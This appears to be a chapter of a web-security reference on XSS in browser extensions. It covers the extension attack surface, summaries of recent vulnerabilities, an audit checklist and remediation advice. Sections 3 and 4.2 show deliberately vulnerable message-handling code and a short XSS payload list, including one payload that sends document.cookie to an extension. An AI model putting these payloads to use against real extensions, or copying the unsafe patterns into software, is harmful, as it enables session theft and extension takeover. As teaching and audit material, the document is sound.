# 57 - Browser Extension XSS

## Overview

Browser extensions operate with elevated privileges compared to regular web pages. Extensions can access cross-origin data, manipulate browser tabs, read page content, and interact with native applications. XSS in a browser extension is significantly more dangerous than XSS in a web page because the attacker gains access to the extension's permission set, which may include reading all browsing data, modifying web requests, and accessing local files. This document covers notable 2024-2026 extension XSS vulnerabilities, the extension exploitation model, and detection techniques.

---

## 1. Extension Exploitation Model

### 1.1 Why Extension XSS Is More Dangerous

| Aspect | Web Page XSS | Extension XSS |
|--------|-------------|---------------|
| Origin access | Single origin | All origins the extension has permissions for |
| Cookie access | Same-origin cookies | Potentially all cookies via `cookies` permission |
| Tab access | Current tab only | All tabs via `tabs` permission |
| Network access | Subject to CSP/CORS | Can bypass CORS via background scripts |
| File system | No access | Possible via `nativeMessaging` or `downloads` |
| Persistence | Session-limited | Can modify extension storage, persist across sessions |
| Privilege level | User context | Extension context (elevated) |

### 1.2 Extension Architecture Attack Surface

```
Content Scripts (injected into web pages)
  -> Receive messages from web pages
  -> Can be XSS'd via DOM manipulation in the page
  -> Access to extension APIs (limited)

Background Scripts / Service Worker
  -> Full extension API access
  -> Process messages from content scripts
  -> XSS here = full extension compromise

Popup / Options / Side Panel HTML
  -> Rendered in extension context
  -> Full extension API access
  -> XSS here = full extension compromise

DevTools Panel
  -> Access to DevTools APIs
  -> Can inspect page content
  -> XSS here = code execution in inspected page
```

### 1.3 Common Vulnerability Patterns

1. **Unsafe message handling**: Content script receives `postMessage` from web page, passes to background script without validation
2. **Unsafe innerHTML in popup/options**: Extension UI renders user data or web content via innerHTML
3. **Unsafe `chrome.tabs.executeScript`**: Extension executes code constructed from untrusted input
4. **Unsafe `eval()` in background**: Background script evaluates data received from content scripts
5. **Unsafe URL construction**: Extension navigates to URLs built from untrusted input

---

## 2. Notable Extension XSS Vulnerabilities (2024-2026)

### 2.1 Claude Browser Extension: Zero-Click XSS (2026)

**Affected product**: Claude browser extension (Anthropic)
**Severity**: Critical (zero-click)
**Disclosure**: 2026

**Vulnerability**: A zero-click XSS vulnerability in the Claude browser extension allowed arbitrary JavaScript execution without user interaction. The extension's content script processed page content or messages without proper sanitization, enabling an attacker to craft a web page that, when visited by a user with the Claude extension installed, would execute JavaScript in the extension's context.

**Impact**:
- Access to the extension's permissions (browsing data, tab manipulation)
- Potential access to Claude conversation history stored locally
- Ability to send requests as the authenticated user
- Cross-origin data access through the extension's background script

**Key insight**: AI assistant extensions are high-value targets because they often require broad permissions (access to page content for context, ability to modify pages for UI injection) and process untrusted web content.

### 2.2 DeepL Translator CVE-2026-40451

**Affected product**: DeepL browser extension
**Severity**: High

**Vulnerability**: XSS in the DeepL browser extension's translation rendering. The extension processes web page text for translation and renders the translated result back into the page. Insufficient sanitization of the translated text (or the original text passed through the translation pipeline) allowed XSS.

**Exploitation vector**: An attacker crafts page content containing XSS payloads designed to survive the translation round-trip. When the DeepL extension processes and renders the translation, the payload executes.

**Attack scenario**:
1. Attacker creates a page with text containing XSS payload
2. Victim with DeepL extension visits the page
3. Extension automatically or manually translates the page content
4. Translated result is rendered via innerHTML in the page or extension popup
5. XSS payload executes with extension privileges

### 2.3 Automa FP-2023-004: Browser Automation Extension XSS

**Affected product**: Automa browser extension
**Advisory**: FP-2023-004

**Vulnerability**: XSS in the Automa browser automation extension. Automa allows users to create browser automation workflows, and the extension's workflow editor/runner had an XSS vulnerability that could be triggered through crafted workflow definitions.

**Impact**: Because Automa is a browser automation tool, XSS in its context is particularly dangerous:
- Access to all tabs and web content Automa can automate
- Ability to execute arbitrary browser actions (clicks, form fills, navigation)
- Potential to modify saved workflows to include persistent malicious actions
- Access to credentials and data processed by automation workflows

---

## 3. Extension XSS Attack Techniques

### 3.1 Content Script Injection via Web Page

```javascript
// Attacker's web page sends a message to the extension's content script
window.postMessage({
  type: 'EXTENSION_MESSAGE',
  data: '<img src=x onerror=alert(1)>'
}, '*');

// If content script does:
window.addEventListener('message', (event) => {
  if (event.data.type === 'EXTENSION_MESSAGE') {
    // DANGEROUS: Renders received data to DOM
    document.getElementById('extension-ui').innerHTML = event.data.data;
  }
});
```

### 3.2 Extension Popup XSS via Page Data

```javascript
// Extension popup reads data from the current tab
chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
  chrome.tabs.sendMessage(tabs[0].id, { action: 'getData' }, (response) => {
    // DANGEROUS: Renders tab data in popup without sanitization
    document.getElementById('title').innerHTML = response.pageTitle;
    document.getElementById('url').innerHTML = response.pageUrl;
  });
});
```

### 3.3 Background Script Command Injection

```javascript
// Background script processes commands from content scripts
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.action === 'executeCode') {
    // DANGEROUS: Executes code from content script context
    chrome.scripting.executeScript({
      target: { tabId: sender.tab.id },
      func: new Function(message.code)  // Arbitrary code execution
    });
  }
});
```

---

## 4. Detection and Testing Methodology

### 4.1 Extension Analysis

```
1. Download extension source (CRX file → rename to .zip → extract)
2. Review manifest.json:
   - Check permissions (activeTab, tabs, cookies, <all_urls>)
   - Check content_security_policy
   - Identify content scripts and their matches
3. Audit content scripts:
   - Search for innerHTML, outerHTML, document.write
   - Search for eval(), Function(), setTimeout(string)
   - Check message handlers (chrome.runtime.onMessage, window.addEventListener)
4. Audit background/popup scripts:
   - Search for chrome.tabs.executeScript with dynamic code
   - Check message handling from content scripts
   - Look for URL construction from untrusted data
5. Test message passing:
   - Send crafted postMessages from a test page
   - Monitor extension's DOM for injected content
   - Check if extension validates message origin
```

### 4.2 Extension XSS Payloads

```javascript
// EXT-01: postMessage to content script
window.postMessage({
  type: 'EXTENSION_ACTION',
  payload: '<img src=x onerror=chrome.runtime.sendMessage({steal:document.cookie})>'
}, '*');

// EXT-02: Page title XSS (if extension reads document.title)
document.title = '<img src=x onerror=alert(1)>';

// EXT-03: URL parameter XSS (if extension reads location.search)
// Navigate to: https://example.com/?q=<script>alert(1)</script>

// EXT-04: Meta tag injection (if extension reads meta tags)
const meta = document.createElement('meta');
meta.name = 'description';
meta.content = '"><img src=x onerror=alert(1)>';
document.head.appendChild(meta);
```

---

## 5. Remediation for Extension Developers

1. **Never use innerHTML** with data from web pages -- use `textContent` or DOM APIs
2. **Validate message origins**: Check `event.origin` and `sender.url` in message handlers
3. **Use extension CSP**: Set strict `content_security_policy` in `manifest.json`
4. **Minimize permissions**: Request only necessary permissions, use `activeTab` over `<all_urls>`
5. **Sanitize all web content**: Treat all data from web pages as untrusted
6. **Avoid `eval()` and `Function()`**: Never construct code from untrusted data
7. **Use Manifest V3**: Migrate to Manifest V3 which enforces stricter CSP and removes `eval()`
